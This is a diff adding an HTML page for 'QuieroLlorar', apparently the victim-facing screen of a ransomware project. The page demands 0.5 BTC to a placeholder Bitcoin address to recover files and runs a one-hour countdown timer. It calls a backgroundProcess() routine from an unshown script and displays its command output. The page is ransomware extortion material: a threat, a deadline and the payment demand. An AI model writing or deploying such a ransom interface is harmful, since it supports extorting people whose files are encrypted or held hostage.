@@ -1,0 +1,77 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="index.css">
+
+    <title>QuieroLlorar</title>
+</head>
+
+<body>
+    <div class="threat">
+        <p>Send 0.5 BTC to
+        </p>
+        <p id="btc-address">g453bbac4dmgjdfajab5gglpj6fcedoa67jdim75g</p>
+        <p>in less than: </p>
+        </h5>
+        <p class="title" id="demo">
+        </p>
+        <p>to recover your files.</p>
+        <hr>
+        <textarea rows="20" cols="75" id="command-output" disabled="true"></textarea>
+        <div id="status"></div>
+        <hr>
+    </div>
+    <script src="./quierollorar.js"></script>
+    <script>
+        // GLUE to the screen
+        function getCommandOutput() {
+            return document.getElementById("command-output");
+        };
+
+        function getStatus() {
+            return document.getElementById("status");
+        };
+        // End of GLUE
+
+        backgroundProcess();
+    </script>
+    <script>
+        // Set the date we're counting down to
+        var onehour = new Date();
+        onehour.setHours(onehour.getHours() + 1);
+        // onehour = onehour.setTime(onehour.getTime() + 1 * 3600)
+        var countDownDate = onehour.getTime();
+
+        // Update the count down every 1 second
+        var x = setInterval(function() {
+
+            // Get today's date and time
+            var now = new Date().getTime();
+
+            // Find the distance between now and the count down date
+            var distance = countDownDate - now;
+
+            // Time calculations for days, hours, minutes and seconds
+            var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+            var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+            var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+            var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+
+            // Display the result in the element with id="demo"
+            document.getElementById("demo").innerHTML = days + "d " + hours + "h " +
+                minutes + "m " + seconds + "s ";
+
+            // If the count down is finished, write some text
+            if (distance < 0) {
+                clearInterval(x);
+                document.getElementById("demo").innerHTML = "EXPIRED";
+            }
+        }, 1000);
+    </script>
+</body>
+
+</html>
